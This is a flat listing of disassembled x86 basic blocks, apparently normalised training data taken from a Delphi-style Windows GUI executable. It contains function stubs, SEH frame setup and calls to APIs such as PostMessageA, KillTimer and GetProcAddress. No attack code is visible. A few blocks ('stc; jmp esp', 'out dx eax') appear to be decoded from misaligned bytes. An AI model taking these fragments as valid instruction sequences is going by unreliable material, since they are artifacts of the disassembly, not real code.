sub_43a162
stc
jmp esp
sub_43aef6
clc
add al [ eax ]
[ eax + 0x43f6 ]
sub_43b77c
mov eax [ rw-data ]
retn
sub_43b784
mov [ rw-data ] eax
retn
sub_43b993
jmp sub_404b30
sub_43b9d1
jmp sub_404de4
sub_43b9d8
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43bd3a
jmp sub_404de4
sub_43bd41
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43be11
jmp sub_404de4
sub_43be18
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43beac
movzx eax [ eax + 0x1f ]
xor al 0x1
retn
sub_43c5e8
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_43cc9c
sub_43c604
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_43c5e8
sub_43c724
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_43cc9c
sub_43c73c
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_43cc9c
sub_43c754
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_43cc9c
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_43c780
mov eax [ eax + 0x4 ]
movzx eax [ eax + 0x258 ]
xor al 0x1
retn
sub_43c790
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_43cc9c
retn
sub_43ca74
push ebx
mov ebx edx
mov edx ebx
call sub_454808
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_43cae4
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1dc ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1db ] 0x0
je r-xdata
sub_43cc0c
jmp sub_404de4
sub_43cc13
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43cc1c
push ebx
mov ebx eax
cmp [ ebx + 0x25c ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x250 ]
call sub_43c018
mov eax [ ebx + 0x254 ]
call sub_43c018
sub_43cc7c
push esi
mov esi eax
mov eax [ esi + 0x250 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_43cc8c
push esi
mov esi eax
mov eax [ esi + 0x254 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_43cd87
jmp sub_404de4
sub_43cd94
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_43cdac
sub_43cfc8
retn
sub_43d038
jmp sub_404de4
sub_43d087
jmp sub_404de4
sub_43d0bc
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_456794
retn
mov ecx [ eax + 0x250 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
call sub_43c2a4
retn
sub_43d0e0
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_4567b4
retn
mov ecx [ eax + 0x254 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x254 ]
call sub_43c2a4
retn
sub_43d1e5
jmp sub_404de4
sub_43d1ec
mov eax [ ebp - 0x4 ]
call sub_458904
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_43bf04
mov eax [ ebp - 0x4 ]
call sub_43cc9c
sub_43d320
jmp sub_404de4
sub_43d358
jmp sub_404de4
sub_43d35f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d37f
lea eax [ ebp - 0x114 ]
call sub_405530
retn
sub_43d378
jmp sub_404de4
sub_43d37f
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_43d70c
jmp sub_404de4
sub_43d713
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4049c4
sub_43d769
jmp sub_404b30
sub_43d7e5
jmp sub_404b30
sub_43d7ea
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4467a4
call sub_404f40
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43dc21
jmp sub_404de4
sub_43dc28
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43df4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dc40
mov [ ebx + 0x2b8 ] eax
pop esi
pop ebx
retn
sub_43df64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43dfd8
mov edx eax
mov eax esi
call sub_41f584
pop esi
pop ebx
retn
sub_43df80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43fb38
mov edx eax
mov eax esi
call sub_41f584
pop esi
pop ebx
retn
sub_43dfd8
push ebx
mov ebx eax
mov eax ebx
call sub_43f694
mov edx r-xdata
call sub_42558c
pop ebx
retn
sub_43e0e4
push ebx
mov ebx eax
mov eax ebx
call sub_43e0f4
xor al 0x1
pop ebx
retn
sub_43e0f4
cmp [ eax + 0x258 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x250 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x254 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_43e150
push ebx
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
sub_43e170
push ebx
cmp [ eax + 0x2fa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2fc ]
call [ ebx + 0x2f8 ]
sub_43e190
push ebx
cmp [ eax + 0x312 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
sub_43e2d0
mov edx [ eax + 0x1b4 ]
test edx edx
je r-xdata
xor eax eax
retn
push 0x4
push edx
call GetWindow
retn
sub_43e536
jmp sub_404de4
sub_43e53d
pop ebx
pop ecx
pop ebp
retn
sub_43e544
xor eax eax
retn
sub_43e5f8
jmp sub_404de4
sub_43e9a4
jmp sub_404de4
sub_43e9ab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_404650
retn
sub_43e9c1
jmp sub_404de4
sub_43eaab
jmp sub_404de4
sub_43eab2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43eacf
mov eax [ ebp - 0xc ]
call sub_404650
retn
sub_43eac8
jmp sub_404de4
sub_43eaef
jmp sub_404de4
sub_43ede6
jmp sub_404de4
sub_43ef7c
jmp sub_404de4
sub_43f694
mov eax [ eax + 0x280 ]
retn
sub_43f69c
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_43f6a8
movzx eax [ eax + 0x5e ]
xor al 0x1
retn
sub_43f840
jmp sub_404de4
sub_43fb28
jmp sub_404de4
sub_43fb2f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43fb38
mov eax [ eax + 0x2a4 ]
mov eax [ eax ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_43fbe0
cmp dl [ eax + 0x278 ]
je r-xdata
retn
mov [ eax + 0x278 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_454ff0
sub_43fcb0
mov eax [ eax + 0x2a4 ]
cmp [ eax ] 0x0
setne al
retn
sub_43fcf4
push ebx
mov ebx eax
mov eax ebx
call sub_457afc
mov eax [ ebx + 0x280 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_424fb8
sub_43fd78
push ebx
mov ebx eax
mov eax ebx
call sub_457b24
mov eax [ ebx + 0x280 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_425630
sub_43fd98
push ebx
mov ebx eax
mov eax ebx
call sub_43f84c
mov edx [ ebx + 0x290 ]
mov eax ebx
call sub_43f914
pop ebx
retn
sub_4408c5
lea eax [ ebp - 0xb4 ]
call sub_405530
retn
sub_4408d1
jmp sub_404de4
j_sub_4408c5
jmp sub_4408c5
sub_4408d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4409dc
jmp sub_404de4
sub_440b80
jmp sub_404de4
sub_440b87
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440e79
jmp sub_404de4
sub_440e80
mov eax [ rw-data ]
call sub_443e28
mov [ ebp - 0x5 ] 0x1
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_440e9e
add [ eax ] al
retn
sub_441124
push ebx
cmp [ eax + 0x302 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x304 ]
call [ ebx + 0x300 ]
sub_441144
mov eax [ eax + 0x288 ]
call sub_42b008
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_445f74
sub_4412eb
jmp sub_404de4
sub_441338
jmp sub_404de4
sub_44133f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441362
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_425608
retn
sub_44135b
jmp sub_404de4
sub_441362
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441548
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_441144
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_44168c
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_45786c
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4418cc
mov ecx [ eax + 0x290 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_437ae0
sub_4419b7
jmp sub_404de4
sub_4419be
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441a40
call sub_442a04
retn
sub_441a48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf4 ]
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_441ea2
jmp sub_404de4
sub_441ea9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442338
jmp sub_404b30
sub_442791
jmp sub_404b30
sub_4428bf
jmp sub_404de4
sub_4428c6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4428e3
lea eax [ ebp - 0x8 ]
call sub_405530
retn
sub_4428dc
jmp sub_404de4
sub_4428e3
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4428ec
push ebx
mov ebx eax
mov eax [ ebx + 0x288 ]
call sub_42b008
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_43e088
sub_44290c
call sub_404650
retn
sub_442964
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4429ca
jmp sub_404de4
sub_442b79
jmp sub_404b30
sub_442ba4
xor edx edx
call sub_43e40c
retn
sub_442bac
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_43e40c
mov eax ebx
call sub_450af8
pop ebx
retn
sub_442c43
jmp sub_404de4
sub_442c4a
pop ebx
pop ecx
pop ebp
retn
sub_442c80
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_4585f8
push eax
call PostMessageA
pop ebx
retn
sub_442eae
jmp sub_404de4
sub_442f4f
jmp sub_404de4
sub_442f59
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442f78
mov eax [ rw-data ]
call sub_445404
retn
sub_442f71
jmp sub_404de4
sub_442f78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442f95
lea eax [ ebp - 0x20 ]
call sub_405530
retn
sub_442f8e
jmp sub_404de4
sub_442f95
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443078
cmp [ eax + 0x30 ] 0x0
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_44493c
retn
retn
call sub_44fafc
sub_443420
mov edx eax
mov eax [ rw-data ]
call sub_4467a4
mov al 0x1
retn
sub_443508
cmp dl [ eax + 0x328 ]
je r-xdata
retn
mov [ eax + 0x328 ] dl
call sub_443430
sub_44351c
cmp dl [ eax + 0x329 ]
je r-xdata
retn
mov [ eax + 0x329 ] dl
call sub_443430
sub_443530
cmp edx [ eax + 0x354 ]
je r-xdata
retn
mov [ eax + 0x354 ] edx
call sub_443430
sub_443584
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x328 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x350 ] 0x0
je r-xdata
sub_443774
jmp sub_404de4
sub_44377b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443784
push ebx
mov ebx eax
mov eax ebx
call sub_456e20
mov eax ebx
call sub_456fac
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_442c80
sub_443a05
jmp sub_404de4
sub_443a0c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443a14
push ebx
mov ebx edx
mov edx ebx
call sub_4572c8
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_44fc18
pop ebx
retn
sub_443a6c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_443ad4
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_443a84
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_443ad4
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_443aa0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_443ad4
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_443ab8
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_443ad4
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_443d78
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_443d84
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_443df0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_419898
pop esi
pop ebx
retn
sub_443e04
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_443e0c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_419898
pop esi
pop ebx
retn
sub_443e20
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_443efc
mov eax [ eax + 0x54 ]
call sub_419740
retn
sub_443f08
mov eax [ eax + 0x54 ]
call sub_4199dc
retn
sub_44415f
jmp sub_404de4
sub_4441a3
jmp sub_404de4
sub_4441aa
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4441f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_443ff8
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_405584
pop esi
pop ebx
retn
sub_444264
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_419898
pop esi
pop ebx
retn
sub_444278
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_44448b
jmp sub_404de4
sub_444492
pop ebx
mov esp ebp
pop ebp
retn
sub_444498
inc [ eax + 0x8c ]
retn
sub_4444a0
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_4444c0
sub_4444c0
xor edx edx
call sub_44493c
retn
sub_44492e
jmp sub_404de4
sub_4449b5
jmp sub_404de4
sub_4449c4
add eax 0x30
call sub_40f944
retn
sub_444a08
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x8d ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_444a59
jmp sub_404b30
sub_444a5e
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4467a4
call sub_404f40
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_444cac
call sub_444c74
mov eax [ rw-data ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_43f5c4
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_445250
jmp sub_404de4
sub_445257
pop ebx
mov esp ebp
pop ebp
retn
sub_4453d8
push ebx
inc [ eax + 0xc4 ]
cmp [ eax + 0xc4 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0x10a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_445404
push ebx
dec [ eax + 0xc4 ]
cmp [ eax + 0xc4 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x112 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_445430
xor edx edx
call sub_445334
retn
sub_445438
mov dl 0x1
call sub_445334
retn
sub_445750
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_445768
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_445835
jmp sub_404de4
sub_44583c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445f57
jmp sub_404b30
sub_446734
call sub_40f320
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_44699c
jmp sub_404de4
sub_4469a3
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_446a6b
jmp sub_404de4
sub_446a72
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446cfa
jmp sub_404de4
sub_446d01
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446d83
jmp sub_404de4
sub_446d8a
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446d94
call sub_446a88
retn
sub_446eb9
jmp sub_404b30
sub_446ebe
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4467a4
call sub_404f40
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_446fd0
jmp sub_404b30
sub_447029
jmp sub_404de4
sub_447030
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447159
jmp sub_404de4
sub_44724c
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
cmp [ ebx + 0x4c ] 0x0
setne al
pop ebx
retn
lea eax [ ebx + 0x4c ]
call sub_40700c
call sub_42d310
sub_4472b0
push ebx
mov ebx eax
movzx eax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_4475f1
jmp sub_404de4
sub_447620
jmp sub_404de4
sub_447732
jmp sub_404de4
sub_447739
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_447ad2
jmp sub_404de4
sub_447ad9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447d54
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_447d9f
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_447db0
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_447dc0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_447e3c
mov eax [ eax + 0x2a4 ]
mov eax [ eax + 0x4 ]
retn
sub_447fc0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_447e3c
mov edx [ eax + 0x18 ]
mov eax esi
call sub_41f584
pop esi
pop ebx
retn
sub_447fdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_447e3c
movzx edx [ eax + 0x8 ]
mov eax esi
call sub_41f570
pop esi
pop ebx
retn
sub_447ff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_447e3c
mov edx [ eax + 0xc ]
mov eax esi
call sub_41f584
pop esi
pop ebx
retn
sub_448014
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_447e3c
mov edx [ eax + 0x14 ]
mov eax esi
call sub_41f584
pop esi
pop ebx
retn
sub_448030
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_447e3c
movzx edx [ eax + 0x28 ]
mov eax esi
call sub_41f570
pop esi
pop ebx
retn
sub_44804c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_447e3c
mov edx [ eax + 0x10 ]
mov eax esi
call sub_41f584
pop esi
pop ebx
retn
sub_448114
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_44821c
movzx eax [ rw-data ]
retn
sub_4482ac
movzx eax [ rw-data ]
retn
sub_448327
jmp sub_404de4
sub_44832e
pop ebp
retn
sub_4484a4
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_448629
jmp sub_404de4
sub_448630
pop ebx
pop ecx
pop ebp
retn
sub_448634
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_44863c
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44880c
sub_4486e9
jmp sub_404de4
sub_4486f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_404650
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_44889e
jmp sub_404de4
sub_4488a5
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44893e
jmp sub_404de4
sub_448945
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448962
mov eax [ ebp - 0xc ]
call sub_404650
retn
sub_44895b
jmp sub_404de4
sub_448962
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40484c
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448a1b
jmp sub_404de4
sub_448a22
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448a28
or edx 0xffffffff
call sub_44899c
retn
sub_448e3b
jmp sub_404de4
sub_448e42
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448e5f
mov eax [ ebp - 0xc ]
call sub_404650
retn
sub_448e58
jmp sub_404de4
sub_448e5f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448e7c
mov eax [ ebp - 0x4 ]
call sub_44997c
retn
sub_448e75
jmp sub_404de4
sub_448e7c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449088
jmp sub_404de4
sub_44908f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449094
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_40484c
sub_4490ac
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_418420
pop ebx
retn
sub_449150
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_419740
sub_449267
jmp sub_404de4
sub_44926e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_404650
retn
sub_449284
jmp sub_404de4
sub_449596
jmp sub_404de4
sub_44959d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4495ba
mov eax [ ebp - 0x10 ]
call sub_404650
retn
sub_4495b3
jmp sub_404de4
sub_4495ba
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4495d7
mov eax [ ebp - 0x8 ]
call sub_404650
retn
sub_4495d0
jmp sub_404de4
sub_4495d7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449640
jmp sub_404de4
sub_44975a
jmp sub_404de4
sub_449777
jmp sub_404de4
sub_44992e
jmp sub_404de4
sub_449935
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449978
inc [ eax + 0x5c ]
retn
sub_44997c
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_40484c
sub_4499d0
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_449a92
out dx eax
push edx
push ecx
jmp [ eax ]
sub_449f14
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_4198f4
retn
sub_449f2c
mov al 0x1
retn
sub_449f30
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_42040c
retn
mov eax edx
retn
sub_449f40
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_4203dc
retn
mov al 0x1
retn
sub_44a230
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_419898
pop esi
pop ebx
retn
sub_44a244
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_44a280
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44a500
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4047dc
pop ebx
retn
sub_44a514
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4047dc
pop ebx
retn
sub_44a528
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4047dc
pop ebx
retn
sub_44a53c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4047dc
pop ebx
retn
sub_44a550
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4047dc
pop ebx
retn
sub_44a564
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4047dc
pop ebx
retn
sub_44a578
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4047dc
pop ebx
retn
sub_44a58c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4047dc
pop ebx
retn
sub_44a5a0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4047dc
pop ebx
retn
sub_44a5b4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4047dc
pop ebx
retn
sub_44a5c8
retn
sub_44a5cc
retn
sub_44a5d0
retn
sub_44a5d4
retn
sub_44a5d8
retn
sub_44a5dc
retn
sub_44a5e0
retn
sub_44a5e4
retn
sub_44a5e8
retn
sub_44a5ec
retn
sub_44a5f0
retn
sub_44a5f4
retn
sub_44a8a4
jmp sub_404de4
sub_44ac48
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x90 ] eax
sub_44ac70
push esi
mov si 0xffef
call sub_40484c
pop esi
retn
sub_44ad11
jmp sub_404de4
